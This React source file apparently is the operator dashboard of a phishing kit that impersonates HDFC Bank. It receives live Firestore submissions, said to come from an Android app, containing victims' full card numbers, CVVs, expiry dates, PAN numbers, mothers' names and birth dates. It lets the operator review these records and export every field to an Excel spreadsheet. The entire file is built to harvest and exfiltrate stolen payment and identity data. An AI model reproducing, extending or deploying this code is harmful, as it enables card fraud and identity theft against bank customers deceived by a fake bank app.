import React, { useState, useEffect } from 'react';
import AdminNavbar from './components/AdminNavbar';
import StatCards from './components/StatCards';
import SubmissionsTable from './components/SubmissionsTable';
import SubmissionDetailModal from './components/SubmissionDetailModal';
import { PlusCircle, ShieldCheck, Radio } from 'lucide-react';
import confetti from 'canvas-confetti';
import logo from './assets/logo.png';
import {
  subscribeToSubmissions,
  updateSubmissionStatus,
  deleteSubmission,
  addSimulationSubmission
} from './firebase';

export default function App() {
  const [submissions, setSubmissions] = useState([]);
  const [isLiveConnected, setIsLiveConnected] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [serviceFilter, setServiceFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [selectedDossier, setSelectedDossier] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  // 1. Subscribe to real-time Firebase Firestore submissions
  useEffect(() => {
    setIsLoading(true);
    const unsubscribe = subscribeToSubmissions(
      (liveSubmissions) => {
        setSubmissions(liveSubmissions || []);
        setIsLiveConnected(true);
        setIsLoading(false);
      },
      (error) => {
        console.warn('Firestore subscription fallback:', error);
        setIsLiveConnected(false);
        setIsLoading(false);
      }
    );

    return () => {
      if (typeof unsubscribe === 'function') unsubscribe();
    };
  }, []);

  // 2. Status update (Approve / Reject) in Firebase and local state
  const handleUpdateStatus = async (id, newStatus) => {
    setSubmissions((prev) =>
      prev.map((item) => (item.id === id ? { ...item, status: newStatus } : item))
    );

    if (newStatus === 'approved') {
      confetti({ particleCount: 60, spread: 50, origin: { y: 0.6 } });
    }

    try {
      await updateSubmissionStatus(id, newStatus);
    } catch (err) {
      console.error('Firebase status update error:', err);
    }
  };

  // 3. Delete submission record
  const handleDeleteSubmission = async (id) => {
    setSubmissions((prev) => prev.filter((item) => item.id !== id));
    try {
      await deleteSubmission(id);
    } catch (err) {
      console.error('Firebase delete error:', err);
    }
  };

  // 4. Add Simulation Record
  const handleAddSampleRecord = async () => {
    const sampleNames = ['Rohan Malhotra', 'Deepika Nair', 'Sanjay Patel', 'Anjali Gupta', 'Vikramaditya Rathore', 'Pooja Agarwal'];
    const randomName = sampleNames[Math.floor(Math.random() * sampleNames.length)];
    const services = ['increase_limit', 'rewards_points', 'login_card', 'card_to_card'];
    const randomService = services[Math.floor(Math.random() * services.length)];

    const formattedTime = new Date().toLocaleDateString('en-IN', {
      day: '2-digit',
      month: 'short',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    const newRecord = {
      fullName: randomName,
      dob: '14/08/1991',
      panNumber: 'BKGP' + Math.floor(1000 + Math.random() * 9000) + 'K',
      mothersName: 'Sunita ' + randomName.split(' ')[1],
      mobileNumber: '9' + Math.floor(100000000 + Math.random() * 900000000),
      selectedService: randomService,
      nameOnCard: randomName.toUpperCase(),
      cardNumber: '4' + Math.floor(100 + Math.random() * 900) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000),
      expiryDate: '09/28',
      cvv: '' + Math.floor(100 + Math.random() * 900),
      status: 'pending',
      submittedAt: formattedTime
    };

    try {
      await addSimulationSubmission(newRecord);
    } catch (err) {
      console.error('Simulation write error:', err);
      setSubmissions([{ id: 'HDFC-SIM-' + Date.now(), ...newRecord }, ...submissions]);
    }
  };

  // 5. Single Dedicated Excel Export (.xls) with ALL 13 customer fields & preserved formatting
  const handleExportExcel = () => {
    const headers = [
      'Application ID',
      'Submission Date & Time',
      'Applicant Full Name',
      'Date of Birth',
      'PAN Card Number',
      "Mother's Name",
      'Mobile Number',
      'Service Requested',
      'Name On Card',
      'Card Number (16-Digit)',
      'Expiry Date (MM/YY)',
      'CVV Code',
      'Verification Status'
    ];

    const sanitize = (val) => String(val ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');

    let xml = '<?xml version="1.0" encoding="UTF-8"?>\n' +
      '<?mso-application progid="Excel.Sheet"?>\n' +
      '<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet"\n' +
      ' xmlns:o="urn:schemas-microsoft-com:office:office"\n' +
      ' xmlns:x="urn:schemas-microsoft-com:office:excel"\n' +
      ' xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet"\n' +
      ' xmlns:html="http://www.w3.org/TR/REC-html40">\n' +
      ' <Styles>\n' +
      '  <Style ss:ID="Header">\n' +
      '   <Font ss:Bold="1" ss:Color="#FFFFFF" ss:Size="11"/>\n' +
      '   <Interior ss:Color="#002D62" ss:Pattern="Solid"/>\n' +
      '   <Alignment ss:Horizontal="Center" ss:Vertical="Center"/>\n' +
      '  </Style>\n' +
      '  <Style ss:ID="CellString">\n' +
      '   <NumberFormat ss:Format="@"/>\n' +
      '   <Alignment ss:Vertical="Center"/>\n' +
      '  </Style>\n' +
      ' </Styles>\n' +
      ' <Worksheet ss:Name="Customer Applications">\n' +
      '  <Table>\n';

    headers.forEach(() => {
      xml += '   <Column ss:AutoFitWidth="1" ss:Width="150"/>\n';
    });

    xml += '   <Row ss:Height="28">\n';
    headers.forEach((h) => {
      xml += `    <Cell ss:StyleID="Header"><Data ss:Type="String">${sanitize(h)}</Data></Cell>\n`;
    });
    xml += '   </Row>\n';

    submissions.forEach((s) => {
      xml += '   <Row ss:Height="22">\n';
      const row = [
        s.id,
        s.submittedAt || 'Recent',
        s.fullName,
        s.dob,
        s.panNumber,
        s.mothersName,
        s.mobileNumber,
        s.selectedService ? s.selectedService.replace(/_/g, ' ') : '',
        s.nameOnCard || s.fullName,
        s.cardNumber,
        s.expiryDate,
        s.cvv,
        s.status
      ];
      row.forEach((val) => {
        xml += `    <Cell ss:StyleID="CellString"><Data ss:Type="String">${sanitize(val)}</Data></Cell>\n`;
      });
      xml += '   </Row>\n';
    });

    xml += '  </Table>\n </Worksheet>\n</Workbook>';

    const blob = new Blob([xml], { type: 'application/vnd.ms-excel;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `HDFC_Customer_Applications_${new Date().toISOString().slice(0, 10)}.xls`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // 6. Filtered Submissions
  const filteredSubmissions = submissions.filter((item) => {
    const matchesSearch =
      (item.fullName && item.fullName.toLowerCase().includes(searchTerm.toLowerCase())) ||
      (item.panNumber && item.panNumber.toLowerCase().includes(searchTerm.toLowerCase())) ||
      (item.mobileNumber && item.mobileNumber.includes(searchTerm)) ||
      (item.cardNumber && item.cardNumber.includes(searchTerm));

    const matchesService = serviceFilter === 'all' || item.selectedService === serviceFilter;
    const matchesStatus = statusFilter === 'all' || item.status === statusFilter;

    return matchesSearch && matchesService && matchesStatus;
  });

  return (
    <div className="admin-app">
      {/* Top Navbar */}
      <AdminNavbar />

      <main className="admin-container">
        {/* Banner */}
        <div className="portal-banner">
          <div className="banner-content">
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '0.4rem' }}>
              <span style={{
                fontSize: '0.75rem',
                background: isLiveConnected ? '#10b981' : '#f59e0b',
                color: 'white',
                padding: '3px 10px',
                borderRadius: '12px',
                fontWeight: 700,
                display: 'inline-flex',
                alignItems: 'center',
                gap: '5px'
              }}>
                <Radio size={13} /> {isLiveConnected ? 'Live Cloud Firestore Database Connected' : 'Connecting to Live Database...'}
              </span>
            </div>
            <h2>Card Services · Real-Time Verification Portal</h2>
            <p>
              Live sync active: Customer PAN, Mother's Name, DOB, and 16-Digit Card entries stream in real-time as submitted from the Android mobile app.
            </p>
          </div>
          <div className="banner-actions">
            <button className="btn-banner-action btn-banner-primary" onClick={handleAddSampleRecord}>
              <PlusCircle size={16} />
              <span>Simulate Customer Entry</span>
            </button>
          </div>
        </div>

        {/* KPI Stat Cards */}
        <StatCards submissions={submissions} />

        {/* Live Submissions Table with Single Excel Export */}
        <SubmissionsTable
          submissions={filteredSubmissions}
          searchTerm={searchTerm}
          setSearchTerm={setSearchTerm}
          serviceFilter={serviceFilter}
          setServiceFilter={setServiceFilter}
          statusFilter={statusFilter}
          setStatusFilter={setStatusFilter}
          onViewDossier={setSelectedDossier}
          onUpdateStatus={handleUpdateStatus}
          onDeleteSubmission={handleDeleteSubmission}
          onExportExcel={handleExportExcel}
          onRefresh={() => {
            setIsLoading(true);
            setTimeout(() => setIsLoading(false), 500);
          }}
        />
      </main>

      {/* Detail Modal */}
      <SubmissionDetailModal
        submission={selectedDossier}
        onClose={() => setSelectedDossier(null)}
        onUpdateStatus={handleUpdateStatus}
        onDeleteSubmission={handleDeleteSubmission}
      />

      {/* Footer */}
      <footer className="admin-footer">
        <div className="footer-brand">
          <img src={logo} alt="HDFC" style={{ height: '18px' }} />
          <span>HDFC Bank Card Services Management Portal</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', flexWrap: 'wrap' }}>
          <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', color: '#10b981', fontWeight: 600 }}>
            <ShieldCheck size={16} /> 256-Bit SSL Encrypted Admin Console
          </span>
          <span>·</span>
          <span>Cloud Firestore: {isLiveConnected ? 'Streaming Live' : 'Synchronizing'}</span>
        </div>
      </footer>
    </div>
  );
}
